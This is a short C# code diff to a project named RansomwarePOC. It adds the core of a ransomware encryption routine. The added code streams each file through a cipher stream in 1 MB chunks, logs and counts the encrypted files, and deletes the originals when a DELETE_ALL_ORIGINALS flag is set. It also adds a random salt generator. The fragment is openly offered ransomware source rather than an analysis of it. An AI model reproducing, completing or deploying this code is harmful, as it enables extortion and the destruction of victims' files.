@@ -145,7 +145,43 @@ namespace RansomwarePOC
             //create a buffer (1mb) so only this amount will allocate in the memory and not the whole file
             byte[] buffer = new byte[1048576];
             int read;
+            try
+            {
+                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
+                {
+                    cs.Write(buffer, 0, read);
+                }
+                fsIn.Close();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error: " + ex.Message);
+            }
+            finally
+            {
+                ENCRYPTION_LOG += inputFile + "\n";
+                encryptedFileCount++;
+                cs.Close();
+                fsCrypt.Close();
+                if (DELETE_ALL_ORIGINALS)
+                {
+                    File.Delete(inputFile);
+                }
+            }
         }
 
+        public static byte[] GenerateRandomSalt()
+        {
+            byte[] data = new byte[32];
+
+            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
+            {
+                for (int i = 0; i < 10; i++)
+                {
+                    rng.GetBytes(data);
+                }
+            }
+            return data;
+        }
     }
 }
